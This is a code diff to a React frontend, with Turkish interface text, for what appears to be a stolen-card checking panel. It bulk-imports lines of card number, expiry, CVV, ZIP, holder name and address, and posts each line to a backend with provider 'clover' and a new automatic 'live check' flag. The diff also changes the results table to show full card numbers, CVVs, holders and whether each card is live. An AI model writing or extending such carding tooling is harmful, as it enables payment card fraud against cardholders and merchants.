@@ -239,7 +239,7 @@ function parseImportedCards(text) {
     const items = Array.isArray(parsed) ? parsed : [parsed]
     const lines = items.map(objectToCardLine).filter(Boolean)
     return { lines, skipped: Math.max(0, items.length - lines.length) }
-  } catch (_) {
+  } catch {
     const lines = parseCreditCardBlocks(raw)
     return { lines, skipped: lines.length ? 0 : physicalLines.length }
   }
@@ -263,7 +263,7 @@ function AddCardsModal({ value, setValue, feedback, saving, progress, onClose, o
             rows="10"
             value={value}
             onChange={(event) => setValue(event.target.value)}
-            placeholder={'cardnumber|exp|cvv|zip|holdername|address\ncardnumber|exp|cvv|zip|holdername|address'}
+            placeholder={'cardnumber|exp|cvv|12345|holdername|address\ncardnumber|exp|cvv|holdername|address'}
           />
         </label>
         <label>
@@ -471,30 +471,35 @@ export function UncheckedCardsPage({ user, runAction }) {
         try {
           const payload = await api('/unchecked-cards', {
             method: 'POST',
-            body: JSON.stringify({ cardsText: line, provider: 'clover' }),
+            body: JSON.stringify({ cardsText: line, provider: 'clover', autoLiveCheck: true, liveMode: 'verification' }),
           })
           pushRequestLog({
-            action: 'Add Card',
-            request: { endpoint: '/api/unchecked-cards', body: { cardsText: line, provider: 'clover' } },
+            action: 'Add + Live Check',
+            request: { endpoint: '/api/unchecked-cards', body: { cardsText: line, provider: 'clover', autoLiveCheck: true, liveMode: 'verification' } },
             response: payload,
             ok: !payload.errors?.length,
             status: payload.status || 'created',
           })
-          inserted += payload.inserted || 0
-          remaining = remaining.filter((item) => item !== line)
-          setCardsText(remaining.join('\n'))
           if (payload.rows?.length) {
+            inserted += payload.rows.length
+            remaining = remaining.filter((item) => item !== line)
+            setCardsText(remaining.join('\n'))
             setUnchecked((current) => ({
               ...current,
               rows: [...payload.rows, ...current.rows].slice(0, current.pageSize || 25),
               total: current.total + payload.rows.length,
             }))
           }
+          if (payload.errors?.length) {
+            payload.errors.forEach((item) => {
+              errors.push({ line, message: item.message || 'Kart kaydedildi ama check sonucu alınamadı' })
+            })
+          }
         } catch (error) {
           const payload = error.data || { message: error.message, status: error.status }
           pushRequestLog({
-            action: 'Add Card Failed',
-            request: { endpoint: '/api/unchecked-cards', body: { cardsText: line, provider: 'clover' } },
+            action: 'Add + Live Check Failed',
+            request: { endpoint: '/api/unchecked-cards', body: { cardsText: line, provider: 'clover', autoLiveCheck: true, liveMode: 'verification' } },
             response: payload,
             ok: false,
             status: error.status || 'failed',
@@ -515,7 +520,7 @@ export function UncheckedCardsPage({ user, runAction }) {
         text: `${inserted} kart kaydedildi${errors.length ? `, ${errors.length} satır kaydedilemedi` : ''}.`,
       })
       setUncheckedPage(1)
-      await loadUnchecked()
+      await reloadAll()
     } finally {
       setAddSaving(false)
       setAddProgress((current) => ({ ...current, current: '' }))
@@ -613,18 +618,17 @@ export function UncheckedCardsPage({ user, runAction }) {
           <table>
             <thead>
               <tr>
-                <th>Masked PAN</th>
-                <th>Exp</th>
-                <th>ZIP</th>
-                <th>Holder</th>
-                <th>Address</th>
+                <th>Country</th>
                 <th>Bank</th>
                 <th>Level</th>
                 <th>Type</th>
-                <th>Country</th>
-                <th>BIN</th>
+                <th>PAN</th>
+                <th>Exp</th>
+                <th>Cvv</th>
+                <th>Holder</th>
                 <th>Checked</th>
                 <th>Live</th>
+                <th>Mesaj</th>
                 <th>Added</th>
                 <th>Action</th>
               </tr>
@@ -632,18 +636,16 @@ export function UncheckedCardsPage({ user, runAction }) {
             <tbody>
               {unchecked.rows.map((card) => (
                 <tr key={card.id}>
+                                    <td>{card.countryCode || '-'}</td>
                   <td>{card.maskedPan}</td>
                   <td>{card.exp}</td>
-                  <td>{card.zip || '-'}</td>
+                  <td>{card.cvv}</td>
                   <td title={card.holderName || ''}>{truncateText(card.holderName, 20)}</td>
-                  <td className="address-cell" title={card.address || ''}>{truncateText(card.address, 35)}</td>
-                  <td title={card.bank || ''}>{truncateText(card.bank, 15)}</td>
-                  <td>{card.cardLevel || '-'}</td>
-                  <td>{card.cardType || '-'}</td>
-                  <td>{card.countryCode || '-'}</td>
-                  <td>{card.bin}</td>
                   <td><StatusPill value={card.checked} /></td>
                   <td><StatusPill value={card.live} /></td>
+                  <td title={card.operatorMessage || card.lastCheck?.operatorMessage || ''}>
+                    {truncateText(card.operatorMessage || card.lastCheck?.operatorMessage || '-', 44)}
+                  </td>
                   <td>{formatDate(card.createdAt)}</td>
                   <td>
                     {!canRunAuthCheck
@@ -654,8 +656,8 @@ export function UncheckedCardsPage({ user, runAction }) {
                   </td>
                 </tr>
               ))}
-              {uncheckedError && <tr><td colSpan="14" className="muted">{uncheckedError}</td></tr>}
-              {!unchecked.rows.length && !uncheckedError && <tr><td colSpan="14" className="muted">Kayıt yok</td></tr>}
+              {uncheckedError && <tr><td colSpan="15" className="muted">{uncheckedError}</td></tr>}
+              {!unchecked.rows.length && !uncheckedError && <tr><td colSpan="15" className="muted">Kayıt yok</td></tr>}
             </tbody>
           </table>
         </div>
